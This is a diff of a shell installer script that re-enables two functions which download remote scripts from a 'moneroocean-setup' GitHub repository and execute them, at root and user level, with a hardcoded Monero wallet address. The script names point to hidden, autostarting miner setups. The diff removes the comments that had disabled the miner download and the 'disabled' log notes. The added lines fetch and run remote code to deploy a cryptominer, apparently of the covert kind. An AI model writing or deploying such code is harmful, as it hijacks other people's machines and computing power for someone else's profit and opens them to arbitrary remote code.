@@ -1603,27 +1603,25 @@ root_installation() {
     fi
     
     # Run the miner setup
-    # DISABLED TO PREVENT LOOP - uncomment when external script is fixed
-    # local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
-    # download_and_execute \
-    #     "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE.sh?t=$(date +%s)" \
-    #     "$wallet" \
-    #     "root miner setup"
+    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+    download_and_execute \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE.sh?t=$(date +%s)" \
+        "$wallet" \
+        "root miner setup"
     
-    log_message "Root installation completed (miner download disabled)"
+    log_message "Root installation completed"
 }
 
 user_installation() {
     log_message "Starting user installation..."
     
-    # DISABLED TO PREVENT LOOP - uncomment when external script is fixed
-    # local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
-    # download_and_execute \
-    #     "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_gdm2_WITH_AUTOSTART.sh?t=$(date +%s)" \
-    #     "$wallet" \
-    #     "user miner setup"
+    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+    download_and_execute \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_gdm2_WITH_AUTOSTART.sh?t=$(date +%s)" \
+        "$wallet" \
+        "user miner setup"
     
-    log_message "User installation completed (miner download disabled)"
+    log_message "User installation completed"
 }
 
 # --- Main Execution ---
